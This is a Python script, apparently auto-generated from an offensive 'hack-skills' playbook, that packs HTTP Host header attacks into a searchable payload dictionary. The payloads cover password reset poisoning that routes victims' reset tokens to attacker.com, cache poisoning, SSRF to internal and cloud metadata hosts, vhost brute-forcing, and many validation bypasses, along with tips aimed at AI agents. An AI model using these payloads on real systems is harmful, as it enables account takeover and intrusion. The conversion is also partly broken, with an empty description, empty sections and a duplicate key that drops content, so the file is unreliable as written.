#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/http-host-header-attacks

Skill: SKILL: HTTP Host Header Attacks — Injection & Routing Abuse
Desc : >-

Run:  python hack-skills-http-host-header-attacks.py --help
      python hack-skills-http-host-header-attacks.py --list
      python hack-skills-http-host-header-attacks.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/http-host-header-attacks'
TITLE = 'SKILL: HTTP Host Header Attacks — Injection & Routing Abuse'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: http-host-header-attacks", "description: >-", "HTTP Host header injection and routing abuse playbook. Use when the application", "trusts the Host header for generating URLs, routing requests, or access control", "\u2014 enabling password reset poisoning, web cache poisoning, SSRF via routing,", "and virtual host bypass."],
    'skill-http-host-header-attacks-injection-routing-abuse': [],
    '0-related-routing': ["- [web-cache-deception](../web-cache-deception/SKILL.md) when Host injection is combined with cache behavior", "- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) when Host header routes requests to internal services", "- [open-redirect](../open-redirect/SKILL.md) when Host injection causes redirect to attacker domain", "- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) when Host manipulation helps bypass WAF routing", "- [request-smuggling](../request-smuggling/SKILL.md) when smuggling enables Host header manipulation past front-end validation", "- [subdomain-takeover](../subdomain-takeover/SKILL.md) when Host routing exposes internal vhosts resolvable via subdomain"],
    '1-attack-surface': ["The Host header is used by web applications and infrastructure for:"],
    '2-password-reset-poisoning': ["The most common and impactful Host header attack."],
    'how-it-works': ["1. Attacker requests password reset for victim@target.com", "2. Attacker modifies Host header in the reset request:", "POST /forgot-password HTTP/1.1", "Host: attacker.com    \u2190 injected", "email=victim@target.com", "3. Server generates reset link using Host header value:", "\"Click here to reset: https://attacker.com/reset?token=SECRET_TOKEN\"", "4. Victim receives email, clicks link \u2192 token sent to attacker", "5. Attacker uses token on real target.com to reset password"],
    'testing': ["```http", "POST /forgot-password HTTP/1.1", "Host: attacker-collaborator.burpcollaborator.net", "Content-Type: application/x-www-form-urlencoded", "email=victim@target.com", "Check Burp Collaborator for incoming HTTP request with the reset token."],
    'variants': ["- Some apps concatenate: `Host: target.com.attacker.com` \u2192 link becomes `https://target.com.attacker.com/reset?token=xxx`", "- Some apps use only the port portion: `Host: target.com:@attacker.com` \u2192 parsed as `attacker.com` in some URL parsers"],
    '3-web-cache-poisoning-via-host': ["1. Attacker sends:", "GET / HTTP/1.1", "Host: attacker.com", "2. If cache keys on URL path but NOT on Host header:", "\u2192 Response cached with attacker.com in generated links/content", "3. Subsequent users requesting GET / receive the poisoned response", "\u2192 Links point to attacker.com, scripts load from attacker.com", "**Key requirement**: Cache must not include Host header in cache key, but application must use Host in response body.", "Test by sending two requests with different Host values and checking if the second request returns the first's Host in the response."],
    '4-ssrf-via-host-routing': ["When a reverse proxy uses Host header to route to backends:", "GET /api/internal HTTP/1.1", "Host: internal-admin-panel.local", "\u2192 Reverse proxy routes request to internal-admin-panel.local", "\u2192 Attacker accesses internal service", "Common in:", "- Nginx `proxy_pass` based on `$host`", "- Apache `ProxyPass` with virtual host routing", "- Kubernetes Ingress controllers", "- Cloud load balancers"],
    '5-virtual-host-bypass': ["Many servers host multiple applications on the same IP via virtual hosting:", "Target:  Host: www.target.com  \u2192 public site", "Hidden:  Host: admin.target.com \u2192 admin panel (not in public DNS)", "Hidden:  Host: staging.target.com \u2192 staging environment", "Hidden:  Host: localhost \u2192 server status page"],
    'discovery': ["1. Brute-force Host header with common vhost names:", "ffuf -u http://TARGET_IP -H \"Host: FUZZ.target.com\" -w vhosts.txt", "2. Try special values:", "Host: localhost", "Host: 127.0.0.1", "Host: admin", "Host: internal", "Host: intranet", "3. Compare response size/content to identify different vhosts"],
    '6-bypass-techniques-when-host-is-validated': [],
    '6-1-override-headers': ["Many frameworks/proxies trust these headers over the Host header:", "Test all simultaneously:", "```http", "GET /forgot-password HTTP/1.1", "Host: target.com", "X-Forwarded-Host: attacker.com", "X-Host: attacker.com", "X-Original-URL: /forgot-password", "Forwarded: host=attacker.com"],
    '6-2-absolute-url-in-request-line': ["```http", "GET http://attacker.com/path HTTP/1.1", "Host: target.com", "Per HTTP/1.1 spec (RFC 7230): if the request line contains an absolute URI, the Host header SHOULD be ignored. Some servers follow this, some don't \u2014 the mismatch between proxy and backend creates the vulnerability."],
    '6-3-double-host-header': ["```http", "GET /path HTTP/1.1", "Host: target.com", "Host: attacker.com", "Behavior varies:", "- Some proxies validate first Host, app uses second", "- Some servers concatenate: `target.com, attacker.com`", "- RFC says: if both differ, return 400. Most servers don't."],
    '6-4-host-with-port-credentials': ["```http", "Host: target.com:@attacker.com", "Host: target.com:evil.com", "Host: target.com#@attacker.com", "Host: attacker.com%23@target.com", "URL parsers may extract the \"host\" portion differently when credentials (`@`) or fragments (`#`) are present."],
    '6-5-trailing-dot': ["```http", "Host: target.com.", "DNS treats `target.com.` and `target.com` identically (trailing dot = FQDN). But Host validation may not strip the trailing dot \u2192 `target.com. \u2260 target.com` in string comparison \u2192 bypass whitelist."],
    '6-6-tab-space-injection': ["```http", "Host: target.com\\tattacker.com", "Host: target.com attacker.com", "Some parsers split on whitespace; the server may use `attacker.com` portion while validation checks `target.com` portion."],
    '6-7-wrap-around-enclosed-values': ["```http", "Host: \"attacker.com\"", "Host: <attacker.com>", "Quoted or bracketed values may be stripped by the app but not by the validator."],
    '7-framework-specific-behavior': [],
    '8-connection-state-attacks': ["A sophisticated variant exploiting HTTP keep-alive:", "Connection 1:", "Request 1: GET / HTTP/1.1    \u2190 Valid Host: target.com", "Host: target.com     \u2192 Proxy validates, forwards, keeps connection open", "Request 2: GET /admin HTTP/1.1  \u2190 Evil Host on SAME connection", "Host: evil.com       \u2192 Some proxies skip validation on subsequent requests", "(they validated the connection on first request)", "This works against proxies that perform Host validation only on the first request of a keep-alive connection."],
    'testing': ["1. Use Burp Repeater with \"Connection: keep-alive\"", "2. Send normal request first", "3. On same connection, send request with manipulated Host", "4. Check if second request is processed differently"],
    '9-host-header-attack-decision-tree': ["Application uses Host header in responses/behavior?", "\u251c\u2500\u2500 Test direct Host injection", "\u2502   \u251c\u2500\u2500 Change Host to attacker domain \u2192 reflected in response?", "\u2502   \u2502   \u251c\u2500\u2500 YES \u2192 Check impact:", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 In password reset emails? \u2192 PASSWORD RESET POISONING", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 In cached responses? \u2192 WEB CACHE POISONING", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 In redirects? \u2192 OPEN REDIRECT", "\u2502   \u2502   \u2502   \u2514\u2500\u2500 In script/link URLs? \u2192 XSS VIA HOST", "\u2502   \u2502   \u2514\u2500\u2500 NO (400/403/different response) \u2192 Host is validated", "\u2502   \u2502", "\u2502   \u2514\u2500\u2500 Host validated? Try bypasses:", "\u2502       \u251c\u2500\u2500 X-Forwarded-Host header", "\u2502       \u251c\u2500\u2500 X-Host / X-Original-URL / Forwarded header", "\u2502       \u251c\u2500\u2500 Absolute URL in request line", "\u2502       \u251c\u2500\u2500 Double Host header", "\u2502       \u251c\u2500\u2500 Host: target.com:@attacker.com (URL parser confusion)", "\u2502       \u251c\u2500\u2500 Host: target.com. (trailing dot)", "\u2502       \u251c\u2500\u2500 Tab/space injection in Host value", "\u2502       \u2514\u2500\u2500 Connection-state attack (valid first request, evil second)", "\u251c\u2500\u2500 Test virtual host enumeration", "\u2502   \u251c\u2500\u2500 Brute-force Host values against target IP", "\u2502   \u251c\u2500\u2500 Try: localhost, admin, staging, internal, intranet", "\u2502   \u2514\u2500\u2500 Compare response sizes for different Host values", "\u251c\u2500\u2500 Test SSRF via Host routing", "\u2502   \u251c\u2500\u2500 Host: 127.0.0.1 \u2192 internal service?", "\u2502   \u251c\u2500\u2500 Host: internal-hostname.local \u2192 internal routing?", "\u2502   \u2514\u2500\u2500 Host: 169.254.169.254 \u2192 cloud metadata?", "\u2514\u2500\u2500 No Host-based behavior found", "\u2514\u2500\u2500 Check if app uses Host in server-side operations", "(email generation, webhook URLs, API callbacks)"],
    '10-trick-notes-what-ai-models-miss': ["1. **Password reset poisoning doesn't require the victim to be logged in** \u2014 you request the reset, the victim just clicks the link. The token lands on your server.", "2. **X-Forwarded-Host is the #1 missed bypass**: Most Host validation checks `Host` header but frameworks silently prefer `X-Forwarded-Host` when behind a proxy.", "3. **Double Host header is protocol-valid but behavior-undefined**: RFC says reject with 400, but almost no server actually does this. The mismatch between proxy and app is the vulnerability.", "4. **Absolute URI overrides Host per RFC**: `GET http://evil.com/path HTTP/1.1\\nHost: target.com` \u2014 the spec says use the request-line URI. But not all implementations agree.", "5. **Cache poisoning via Host requires the cache to exclude Host from the key**: Most CDNs include Host in the cache key. But custom Varnish/Nginx caches may not. Also test with `X-Forwarded-Host` as cache key differentiator.", "6. **Connection-state attacks are rarely tested**: Automated scanners don't test keep-alive behavior. Manual testing via Burp Repeater's connection reuse is essential.", "7. **DNS rebinding + Host attacks**: If you control DNS, point your domain to the target's IP \u2192 your domain resolves to their server \u2192 Host header says your domain, but request hits their server. Useful for bypassing IP-based access controls."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()